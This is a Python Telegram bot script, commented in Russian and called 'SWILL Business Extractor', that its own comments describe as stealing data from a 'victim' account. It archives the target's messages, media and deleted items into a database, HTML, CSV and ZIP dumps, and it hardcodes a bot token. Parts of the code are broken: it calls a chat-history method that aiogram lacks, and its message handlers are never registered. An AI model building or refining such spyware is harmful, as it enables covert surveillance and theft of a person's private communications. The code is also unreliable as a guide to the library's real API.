#!/usr/bin/env python3
# SWILL Business Extractor - aiogram версия (БЕЗ API_ID/API_HASH)

import asyncio
import json
import os
import sqlite3
import time
import shutil
import zipfile
from datetime import datetime
from pathlib import Path
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message, ChatMemberUpdated
from aiogram.filters import Command

# ======================================================
#  КОНФИГ (ТОЛЬКО ТОКЕН!)
# ======================================================

BOT_TOKEN = '8389370808:AAGWVhlCEwCh9adLQIHmKkJmIgUQJ5O382I'      # ⚠️ ТОЛЬКО ЭТО НУЖНО!

# ID аккаунта жертвы (у кого воровать данные)
TARGET_ACCOUNT_ID = 8839956404          # ⚠️ ЗАМЕНИ НА ID ЦЕЛИ

# Настройки
SAVE_MEDIA = True          # Сохранять медиа
SAVE_DELETED = True        # Отслеживать удаления

# ======================================================

# Инициализация бота (ТОЛЬКО ТОКЕН!)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Папка для дампа
BASE_PATH = Path.cwd() / f'dump_{TARGET_ACCOUNT_ID}_{int(time.time())}'
MEDIA_PATH = BASE_PATH / 'media'
PHOTOS_PATH = MEDIA_PATH / 'photos'
VIDEOS_PATH = MEDIA_PATH / 'videos'
AUDIO_PATH = MEDIA_PATH / 'audio'
DOCS_PATH = MEDIA_PATH / 'documents'

# Создаём папки
for p in [BASE_PATH, MEDIA_PATH, PHOTOS_PATH, VIDEOS_PATH, AUDIO_PATH, DOCS_PATH]:
    os.makedirs(p, exist_ok=True)

# SQLite БД
conn = sqlite3.connect(BASE_PATH / 'data.db')
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        chat_title TEXT,
        date TEXT,
        from_id TEXT,
        from_name TEXT,
        text TEXT,
        media_type TEXT,
        media_path TEXT,
        is_deleted BOOLEAN DEFAULT 0,
        target_account_id INTEGER
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS progress (
        chat_id INTEGER PRIMARY KEY,
        last_message_id INTEGER
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS deleted_tracking (
        message_id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        deleted_at TEXT
    )
''')

conn.commit()

stats = {'total': 0, 'media': 0, 'chats': 0, 'errors': 0, 'deleted': 0}

async def log(text):
    """Запись в лог"""
    with open(BASE_PATH / 'log.txt', 'a', encoding='utf-8') as f:
        f.write(f'[{datetime.now()}] {text}\n')
    print(f'[LOG] {text}')

async def save_message(msg: Message, chat_title: str, media_path: str = None, media_type: str = None):
    """Сохранение сообщения в БД"""
    try:
        cursor.execute('''
            INSERT OR REPLACE INTO messages 
            (id, chat_id, chat_title, date, from_id, from_name, text, media_type, media_path, target_account_id)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            msg.message_id,
            msg.chat.id,
            chat_title,
            str(msg.date),
            str(msg.from_user.id) if msg.from_user else None,
            msg.from_user.full_name if msg.from_user else 'unknown',
            msg.text or msg.caption or '',
            media_type,
            media_path,
            TARGET_ACCOUNT_ID
        ))
        conn.commit()
        stats['total'] += 1
        return True
    except Exception as e:
        stats['errors'] += 1
        await log(f'Ошибка сохранения: {e}')
        return False

async def download_media(msg: Message):
    """Скачивание медиа из сообщения"""
    if not SAVE_MEDIA:
        return None, None
    
    try:
        media_type = None
        ext = '.bin'
        folder = MEDIA_PATH
        
        if msg.photo:
            media_type = 'photo'
            ext = '.jpg'
            folder = PHOTOS_PATH
            file = msg.photo[-1]
        elif msg.video:
            media_type = 'video'
            ext = '.mp4'
            folder = VIDEOS_PATH
            file = msg.video
        elif msg.audio:
            media_type = 'audio'
            ext = '.mp3'
            folder = AUDIO_PATH
            file = msg.audio
        elif msg.voice:
            media_type = 'voice'
            ext = '.ogg'
            folder = AUDIO_PATH
            file = msg.voice
        elif msg.document:
            media_type = 'document'
            ext = '.dat'
            folder = DOCS_PATH
            file = msg.document
        elif msg.video_note:
            media_type = 'video_note'
            ext = '.mp4'
            folder = VIDEOS_PATH
            file = msg.video_note
        elif msg.sticker:
            media_type = 'sticker'
            ext = '.webp'
            folder = MEDIA_PATH
            file = msg.sticker
        else:
            return None, None
        
        # Имя файла
        filename = f'{msg.message_id}_{int(time.time())}{ext}'
        filepath = folder / filename
        
        # Скачиваем
        await bot.download(file, destination=str(filepath))
        stats['media'] += 1
        await log(f'Скачано медиа: {filename}')
        return str(filepath), media_type
        
    except Exception as e:
        stats['errors'] += 1
        await log(f'Ошибка скачивания: {e}')
        return None, None

async def get_chat_history(chat_id: int):
    """Получение всей истории чата через aiogram"""
    try:
        chat = await bot.get_chat(chat_id)
        chat_title = chat.title or chat.full_name or str(chat_id)
        await log(f'Обработка чата: {chat_title}')
        
        # Проверяем прогресс
        cursor.execute('SELECT last_message_id FROM progress WHERE chat_id = ?', (chat_id,))
        row = cursor.fetchone()
        last_id = row[0] if row else 0
        
        offset_id = last_id
        total_in_chat = 0
        
        while True:
            try:
                # Получаем историю через aiogram
                messages = await bot.get_chat_history(
                    chat_id=chat_id,
                    limit=100,
                    offset_id=offset_id
                )
                
                if not messages:
                    break
                
                for msg in messages:
                    # Пропускаем удалённые
                    if msg.is_automatic_forward:
                        continue
                    
                    # Скачиваем медиа
                    media_path, media_type = await download_media(msg)
                    
                    # Сохраняем сообщение
                    await save_message(msg, chat_title, media_path, media_type)
                    total_in_chat += 1
                    
                    # Обновляем прогресс
                    if msg.message_id > offset_id:
                        offset_id = msg.message_id
                
                # Сохраняем прогресс
                cursor.execute('''
                    INSERT OR REPLACE INTO progress (chat_id, last_message_id)
                    VALUES (?, ?)
                ''', (chat_id, offset_id))
                conn.commit()
                
                if len(messages) < 100:
                    break
                    
            except Exception as e:
                await log(f'Ошибка в чате {chat_id}: {e}')
                break
        
        stats['chats'] += 1
        await log(f'Чат {chat_title} обработан. Сообщений: {total_in_chat}')
        return total_in_chat
        
    except Exception as e:
        await log(f'Ошибка доступа к чату {chat_id}: {e}')
        return 0

async def get_all_business_chats():
    """Получение всех чатов, где есть бот (через Business)"""
    chats = []
    try:
        # Получаем обновления чатов
        # В aiogram нет прямого метода для бизнес-чатов
        # Используем get_updates для поиска
        
        # Получаем список чатов через диалоги (недоступно в aiogram)
        # Используем альтернативный подход: проверяем все известные чаты
        
        # Простой способ: бот собирает данные из чатов, куда его добавили
        # Для Business: бот получает доступ ко всем чатам автоматически
        
        # Возвращаем чат с целевым ID, если он есть
        try:
            chat = await bot.get_chat(TARGET_ACCOUNT_ID)
            if chat:
                chats.append(chat)
                await log(f'Найден целевой чат: {chat.title or chat.full_name}')
        except:
            pass
        
        return chats
        
    except Exception as e:
        await log(f'Ошибка поиска чатов: {e}')
        return chats

async def monitor_new_messages():
    """Мониторинг новых сообщений"""
    @dp.message()
    async def handle_message(msg: Message):
        # Проверяем, что сообщение от целевого аккаунта
        if msg.from_user and msg.from_user.id == TARGET_ACCOUNT_ID:
            chat_title = msg.chat.title or msg.chat.full_name or str(msg.chat.id)
            media_path, media_type = await download_media(msg)
            await save_message(msg, chat_title, media_path, media_type)
            await log(f'Новое сообщение от цели: {msg.message_id}')
        
        # Если бот добавлен в бизнес-чат, проверяем
        elif msg.chat and msg.chat.id == TARGET_ACCOUNT_ID:
            chat_title = msg.chat.title or msg.chat.full_name or str(msg.chat.id)
            media_path, media_type = await download_media(msg)
            await save_message(msg, chat_title, media_path, media_type)
            await log(f'Новое сообщение в целевом чате: {msg.message_id}')
    
    @dp.my_chat_member()
    async def on_bot_added(event: types.ChatMemberUpdated):
        """Когда бота добавляют в чат"""
        if event.new_chat_member.user.id == (await bot.get_me()).id:
            await log(f'Бот добавлен в чат: {event.chat.id}')
            # Начинаем сбор истории
            asyncio.create_task(get_chat_history(event.chat.id))

async def export_html():
    """Экспорт в HTML"""
    cursor.execute('SELECT date, from_name, text, media_path FROM messages ORDER BY date')
    rows = cursor.fetchall()
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>SWILL Export - Target {TARGET_ACCOUNT_ID}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f0f2f5; }}
        .msg {{ background: white; margin: 10px 0; padding: 15px; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }}
        .date {{ color: #666; font-size: 12px; }}
        .from {{ font-weight: bold; color: #1a73e8; }}
        .media {{ color: #34a853; font-size: 12px; }}
    </style>
</head>
<body>
    <h1>SWILL Data Export</h1>
    <p>Target Account ID: {TARGET_ACCOUNT_ID}</p>
    <p>Total messages: {len(rows)}</p>
    <hr>
'''
    for row in rows:
        html += f'''
    <div class="msg">
        <div class="date">{row[0]}</div>
        <div class="from">{row[1]}</div>
        <div>{row[2] or ''}</div>
        <div class="media">{f'Media: {row[3]}' if row[3] else ''}</div>
    </div>
'''
    html += '</body></html>'
    
    with open(BASE_PATH / 'export.html', 'w', encoding='utf-8') as f:
        f.write(html)

async def export_csv():
    """Экспорт в CSV"""
    import csv
    cursor.execute('SELECT date, from_name, text, media_path FROM messages ORDER BY date')
    
    with open(BASE_PATH / 'export.csv', 'w', encoding='utf-8', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Date', 'From', 'Text', 'Media Path'])
        writer.writerows(cursor.fetchall())

async def create_archive():
    """Создание ZIP-архива"""
    zip_path = BASE_PATH.parent / f'swill_dump_{TARGET_ACCOUNT_ID}_{int(time.time())}.zip'
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(BASE_PATH):
            for file in files:
                file_path = Path(root) / file
                arcname = file_path.relative_to(BASE_PATH.parent)
                zipf.write(file_path, arcname)
    return zip_path

async def generate_stats():
    """Генерация статистики"""
    cursor.execute('SELECT COUNT(*) FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
    total = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM messages WHERE target_account_id = ? AND media_path IS NOT NULL', (TARGET_ACCOUNT_ID,))
    media = cursor.fetchone()[0]
    
    with open(BASE_PATH / 'STATS.txt', 'w', encoding='utf-8') as f:
        f.write('='*60 + '\n')
        f.write('SWILL EXTRACTOR - СТАТИСТИКА\n')
        f.write('='*60 + '\n')
        f.write(f'Целевой ID: {TARGET_ACCOUNT_ID}\n')
        f.write(f'Дата сбора: {datetime.now()}\n')
        f.write(f'Всего сообщений: {total}\n')
        f.write(f'Медиа-файлов: {media}\n')
        f.write(f'Обработано чатов: {stats["chats"]}\n')
        f.write(f'Ошибок: {stats["errors"]}\n')
        f.write(f'Папка: {BASE_PATH}\n')
        f.write('='*60 + '\n')

async def main():
    """Главная функция"""
    await log('='*60)
    await log('SWILL БОТ ЗАПУЩЕН (aiogram)')
    await log(f'Целевой ID: {TARGET_ACCOUNT_ID}')
    await log(f'Папка: {BASE_PATH}')
    
    print(f'[SWILL] ===== БОТ ЗАПУЩЕН =====')
    print(f'[SWILL] Цель: {TARGET_ACCOUNT_ID}')
    print(f'[SWILL] Папка: {BASE_PATH}')
    print(f'[SWILL] Ожидание сообщений...')
    
    # Запускаем мониторинг
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())